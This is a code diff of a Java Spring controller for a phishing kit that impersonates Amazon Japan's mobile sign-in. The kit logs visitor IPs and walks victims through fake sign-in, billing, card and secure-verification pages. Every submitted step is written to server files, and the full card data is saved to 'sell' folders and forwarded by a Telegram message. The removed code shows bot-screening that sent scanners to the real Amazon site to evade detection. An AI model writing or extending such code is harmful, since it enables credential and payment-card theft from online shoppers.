@@ -24,6 +24,7 @@ import org.springframework.ui.Model;
 import org.springframework.util.StringUtils;
 import org.springframework.web.bind.annotation.*;
 
+import javax.jws.WebParam;
 import javax.servlet.http.Cookie;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
@@ -40,13 +41,12 @@ import java.util.Map;
 
 @Controller
 @Slf4j
-public class Amazon2MobileController {
+public class Amazon3MobileController {
     @Autowired
     private HttpServletRequest request;
 
     @Autowired
     private AsyncTask asyncTask;
-
 
     @Autowired
     private HttpServletResponse response;
@@ -54,17 +54,19 @@ public class Amazon2MobileController {
     @Autowired
     private CacheService cacheService;
 
-
     @Value("${google.secret:6LcEYsUaAAAAAAfTzIt86eSq8Yc0ljLMqzcoJMmF}")
     private String googleSecret;
 
     @Value("${fish.country:jp}")
     private String fishCountryCode;
 
-    @GetMapping("/version2/mobile/signin")
-    public Object signin(@RequestHeader("User-Agent") String uaStr) {
+    @GetMapping("/version3/mobile/signin")
+    public Object signin(@RequestHeader("User-Agent") String uaStr,Model model) {
+        FishCountryEnum countryEnum = FishCountryEnum.getByCountryCode(fishCountryCode);
+        model.addAttribute("suffix",countryEnum.getSuffix());
+        model.addAttribute("country",countryEnum.getCountryName());
         String ip = IpUtils.getIpAddress(request);
-        String path = "/root/countClickLink2.txt";
+        String path = "/root/countClickLink3.txt";
         LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
         String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd HH:mm:ss");
         if (!FileUtil.exist(path)) {
@@ -73,79 +75,36 @@ public class Amazon2MobileController {
         FileAppender fileAppender = new FileAppender(FileUtil.file(path), 1000, true);
         fileAppender.append(timeStr + ":" + "|" + ip);
         fileAppender.flush();
-        return "version2/mobile/index";
+        return "version3/mobile/index";
     }
 
-    @GetMapping("/")
+    @GetMapping("/version3")
     public Object signin2(@RequestHeader("User-Agent") String uaStr) {
-        FishCountryEnum countryEnum = FishCountryEnum.getByCountryCode(fishCountryCode);
         String ip = IpUtils.getIpAddress(request);
         Integer isBot = (Integer) cacheService.getCommonCache(ip + "checkBot");
         if (null != isBot && isBot == 1) {
-            return "redirect:/"+countryEnum.getVersion()+"/mobile/signin";
+            return "redirect:/version3/mobile/signin";
         }
         return "index";
     }
 
-    @RequestMapping("/amazon/checkBot")
-    @ResponseBody
-    public Object checkBotAndRedirect(@RequestHeader("User-Agent") String uaStr, @RequestParam("response") String response) {
+    @GetMapping("/version3/mobile/homepage/billing")
+    public Object update_billing(Model model) {
         FishCountryEnum countryEnum = FishCountryEnum.getByCountryCode(fishCountryCode);
-        String version = countryEnum.getVersion();
-        String googleUrl = "https://www.recaptcha.net/recaptcha/api/siteverify";
-        String defaulRedirectUrl = "https://amazon.co.jp/?Your_Account_Verified";
-        String redirectUrl = defaulRedirectUrl;
-        Map<String, Object> postParam = new HashMap<>();
-        postParam.put("secret", googleSecret);
-        postParam.put("response", response);
-        String ip = IpUtils.getIpAddress(request);
-        //判定爬虫
-        try {
-            long start = System.currentTimeMillis();
-            String result = HttpRequest.post(googleUrl)
-                    .form(postParam)
-                    .header(Header.USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36")//头信息，多个头信息多次调用此方法即可
-                    .timeout(3000)//超时，毫秒
-                    .execute()
-                    .body();
-            long end = System.currentTimeMillis();
-            JSONObject jsonResult = JSON.parseObject(result);
-
-            //得分
-            if (null != jsonResult && jsonResult.containsKey("score")) {
-                BigDecimal score = ((BigDecimal) jsonResult.get("score"));
-                log.info("checkBot:" + ip + ":" + score + ":" + (end - start) + "ms");
-                if (score.doubleValue() >= 0.3) {
-                    redirectUrl = "/"+version+"/mobile/signin";
-                    addCookie("checkBot", "notBot");
-                    cacheService.setCommonCache(ip + "checkBot", 1);
-                } else {
-                    addCookie("Bot", "Bot");
-                    cacheService.setCommonCache(ip + "checkBot", -1);
-                }
-            } else {
-                log.error("checkBot api failed:{},{},cost:{}ms", ip, result, (end - start));
-                redirectUrl = "/"+version+"/mobile/signin";
-            }
-        } catch (Exception e) {
-            cacheService.setCommonCache(ip + "checkBot", 1);
-            log.error("checkBotAndRedirect ip:{}, error:{}", ip, e.getMessage());
-            redirectUrl = "/"+version+"/mobile/signin";
-        }
-        return redirectUrl;
+        model.addAttribute("suffix",countryEnum.getSuffix());
+        model.addAttribute("country",countryEnum.getCountryName());
+        return "version3/mobile/billing";
     }
 
-    @GetMapping("/version2/mobile/homepage/billing")
-    public Object update_billing() {
-        return "version2/mobile/billing";
+    @GetMapping("/version3/mobile/homepage/card")
+    public Object card(Model model) {
+        FishCountryEnum countryEnum = FishCountryEnum.getByCountryCode(fishCountryCode);
+        model.addAttribute("suffix",countryEnum.getSuffix());
+        model.addAttribute("country",countryEnum.getCountryName());
+        return "version3/mobile/card";
     }
 
-    @GetMapping("/version2/mobile/homepage/card")
-    public Object card() {
-        return "version2/mobile/card";
-    }
-
-    @GetMapping("/version2/mobile/homepage/secure")
+    @GetMapping("/version3/mobile/homepage/secure")
     public Object secure(Model model) {
         try {
             HttpSession session = request.getSession();
@@ -168,19 +127,22 @@ public class Amazon2MobileController {
                 model.addAttribute("bankImage", "card/a3/" + bankImage);
             }
             if (needWebId(cardNumber, binInfo)) {
-                return "version2/mobile/secure3";
+                return "version3/mobile/secure3";
             }
         } catch (Exception e) {
             log.error("secure page error:{}", e.getMessage());
         }
-        return "version2/mobile/secure2";
+        return "version3/mobile/secure2";
     }
 
-    @GetMapping("/version2/mobile/homepage/success")
-    public Object success() {
-        //TODO 不
+    @GetMapping("/version3/mobile/homepage/success")
+    public Object success(Model model) {
+        FishCountryEnum countryEnum = FishCountryEnum.getByCountryCode(fishCountryCode);
+        model.addAttribute("suffix",countryEnum.getSuffix());
+        model.addAttribute("country",countryEnum.getCountryName());
+        model.addAttribute("redUrl",countryEnum.getAmazonUrl());
         addCookie("kiddIp", IpUtils.getIpAddress(request));
-        return "version2/mobile/success";
+        return "version3/mobile/success";
     }
 
     public void addCookie(String key, String value) {
@@ -190,7 +152,7 @@ public class Amazon2MobileController {
         response.addCookie(cookie);//将cookie添加到response的cookie数组中返回给客户端
     }
 
-    @PostMapping("/version2/mobile/signin")
+    @PostMapping("/version3/mobile/signin")
     @ResponseBody
     public Object signinPost() {
         Map<String, String[]> params = request.getParameterMap();
@@ -201,13 +163,13 @@ public class Amazon2MobileController {
         session.setAttribute("userInfo", userInfoMap);
         LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
         String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd");
-        asyncTask.asyncWriteMap(String.format("/root/version2-step1/%s.txt", timeStr), userInfoMap);
+        asyncTask.asyncWriteMap(String.format("/root/version3-step1/%s.txt", timeStr), userInfoMap);
         return new HashMap<String, String>() {{
             put("data", "ok");
         }};
     }
 
-    @PostMapping("/version2/mobile/homepage/billing")
+    @PostMapping("/version3/mobile/homepage/billing")
     @ResponseBody
     public Object billingPost() {
         Map<String, String[]> params = request.getParameterMap();
@@ -223,13 +185,13 @@ public class Amazon2MobileController {
         session.setAttribute("userInfo", userInfoMap);
         LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
         String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd");
-        asyncTask.asyncWriteMap(String.format("/root/version2-step2/%s.txt", timeStr), userInfoMap);
+        asyncTask.asyncWriteMap(String.format("/root/version3-step2/%s.txt", timeStr), userInfoMap);
         return new HashMap<String, String>() {{
             put("data", "ok");
         }};
     }
 
-    @PostMapping("/version2/mobile/homepage/card")
+    @PostMapping("/version3/mobile/homepage/card")
     @ResponseBody
     public Object cardPost() {
         Map<String, String[]> params = request.getParameterMap();
@@ -247,14 +209,14 @@ public class Amazon2MobileController {
         LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
         String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd");
         asyncTask.asyncWriteMap(String.format("/root/version2-step3/%s.txt", timeStr), userInfoMap);
-        asyncTask.asyncSaveFish("/root/lack" + timeStr + "/", userInfoMap);
-        asyncTask.asyncSaveFish("/root/sell" + timeStr + "/", userInfoMap);
+        asyncTask.asyncSaveFish("/root/version3/lack" + timeStr + "/", userInfoMap);
+        asyncTask.asyncSaveFish("/root/version3/sell" + timeStr + "/", userInfoMap);
         return new HashMap<String, String>() {{
             put("data", "ok");
         }};
     }
 
-    @PostMapping("/version2/mobile/homepage/secure")
+    @PostMapping("/version3/mobile/homepage/secure")
     @ResponseBody
     public Object securePost() {
         Map<String, String[]> params = request.getParameterMap();
@@ -269,8 +231,8 @@ public class Amazon2MobileController {
         String timeStr = DateUtil.format(localDateTime, "yyyy-MM-dd");
         asyncTask.asyncWriteMap(String.format("/root/version2-step4/%s.txt", timeStr), userInfoMap);
         asyncTask.asyncSendTgMsg(null, null, userInfoMap);
-        asyncTask.asyncSaveFish("/root/full" + timeStr + "/", userInfoMap);
-        asyncTask.asyncSaveFish("/root/sell" + timeStr + "/", userInfoMap);
+        asyncTask.asyncSaveFish("/root/version3/full" + timeStr + "/", userInfoMap);
+        asyncTask.asyncSaveFish("/root/version3/sell" + timeStr + "/", userInfoMap);
         return new HashMap<String, String>() {{
             put("data", "ok");
         }};
@@ -297,7 +259,7 @@ public class Amazon2MobileController {
         return jsonObject.toJSONString();
     }
 
-    @GetMapping("/zipcode")
+    @GetMapping("/version3/zipcode")
     @ResponseBody
     public Object zipcode(@RequestParam("zipcode") String zipCode, Model model) {
         String jstr = "";
@@ -415,14 +377,5 @@ public class Amazon2MobileController {
             }
         }
         return bankImage;
-    }
-
-    @GetMapping("/version2/testIsMobile")
-    @ResponseBody
-    public Object testIsMobile(String uaStr) {
-        Boolean isMobile = false;
-        UserAgent ua = UserAgentUtil.parse(uaStr);
-        isMobile = ua.isMobile();
-        return isMobile;
     }
 }
